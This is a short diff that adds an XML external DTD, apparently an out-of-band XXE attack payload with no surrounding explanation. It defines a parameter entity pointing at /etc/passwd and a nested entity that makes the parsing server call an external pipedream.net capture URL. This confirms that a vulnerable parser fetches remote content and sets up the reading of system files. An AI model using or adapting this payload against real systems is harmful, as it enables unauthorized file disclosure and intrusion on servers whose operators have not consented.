@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'https://eon476nvto3fn1.m.pipedream.net;'>">
+%eval;
+%test;
